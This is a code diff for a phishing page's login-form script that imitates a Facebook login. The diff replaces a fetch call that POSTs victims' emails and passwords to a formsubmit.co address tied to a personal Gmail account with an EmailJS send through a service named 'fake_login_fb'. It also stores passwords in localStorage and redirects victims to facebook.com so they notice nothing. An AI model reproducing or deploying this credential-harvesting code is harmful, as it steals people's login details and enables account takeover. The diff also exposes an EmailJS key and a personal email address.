@@ -1,3 +1,6 @@
+// Initialize EmailJS
+emailjs.init("xyKHTlWAxK5HLMXyw"); // Replace with your EmailJS public key
+
 document
   .getElementById("login-form")
   .addEventListener("submit", function (event) {
@@ -14,20 +17,16 @@ document
     localStorage.setItem("email", email);
     localStorage.setItem("password", password);
 
-    // Send the data to your email address
-    fetch("https://formsubmit.co/ajax/eng.sagar.aiub@gmail.com", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        email: email,
-        password: password,
-      }),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        console.log("Email sent successfully:", data);
+    // Send the data via EmailJS
+    
+    emailjs
+      .send("fake_login_fb", "template_z6jb42e", {
+        // to_email: "kristar",
+        user_email: email,
+        user_password: password,
+      })
+      .then((response) => {
+        console.log("Email sent successfully:", response);
         window.location.href = "https://www.facebook.com/"; // Redirect after sending email
       })
       .catch((error) => {
